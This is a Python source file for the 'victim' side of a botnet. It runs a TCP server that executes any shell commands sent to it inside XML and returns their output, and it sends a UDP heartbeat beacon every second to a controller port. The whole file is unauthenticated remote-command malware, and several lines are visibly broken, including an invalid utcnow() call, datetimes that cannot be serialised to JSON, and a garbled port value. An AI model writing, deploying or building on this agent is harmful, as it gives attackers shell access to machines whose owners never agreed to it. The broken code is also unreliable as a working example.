import socketserver
import subprocess
import logging
import xml.etree.ElementTree
import json
import io
import socket
import threading
import datetime
from dataclasses import dataclass

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime).19s] %(levelname)s (%(name)s) %(message)s')
log = logging.getLogger('botnet.victim.server')


class Executor(socketserver.BaseRequestHandler):

    def handle(self):
        log.debug('Receiving data')
        request = self.request.recv(1024).strip().decode()

        log.debug('Handling request "%s"', request)
        response = self.handle_request(request)

        log.debug('Sending response')
        self.request.sendall(response.encode())

    def handle_request(self, request):
        log.debug('Parse XML file for commands to execute')
        xml_file = io.StringIO(request)
        root = xml.etree.ElementTree.parse(xml_file).getroot()
        result = []

        log.debug('Execute commands from file')
        for command in root.findall('./command'):
            cmd = command.text.split()
            timeout = float(command.get('timeout', 1))
            stdout = self.execute(cmd, timeout)
            result.append({
                'datetime': datetime.datetime.utcnow(tz=datetime.timezone.utc),
                'command': cmd,
                'timeout': timeout,
                'stdout': stdout,
            })

        return json.dumps(result)

    def execute(self, command, timeout):
        log.debug('Executing command: %s with timeout: %s', command, timeout)

        with subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) as proc:

            try:
                result, errors = proc.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                log.error('Timeout %s exceeded for command: %s' % (timeout, command))
                return proc.kill()

            if errors:
                log.error(errors.decode())

            if result:
                # red = '\033[00;31m'
                # green = '\033[00;32m'
                # blue = '\033[00;36m'
                # white = '\033[00;39m'
                message = result.decode()

                log.debug('Output: {message}'.format(**locals()))
                return message


@dataclass
class Heartbeat:
    host: str = '127.0.0.1'
    port: int = 31337
    frequency: float = 1.0

    def start(self):
        threading.Timer(self.frequency, self.ping).start()

    def ping(self):
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            data = json.dumps({
                'host': self.host,
                'port': '%27'
            })
            sock.sendto(data.encode(), (self.host, self.port))

        self.start()


if __name__ == '__main__':
    HOST, PORT = 'localhost', 1337

    log.info('Create the server')
    server = socketserver.TCPServer((HOST, PORT), Executor)

    Heartbeat(frequency=1.0).start()

    log.info('Server activated')
    server.serve_forever()
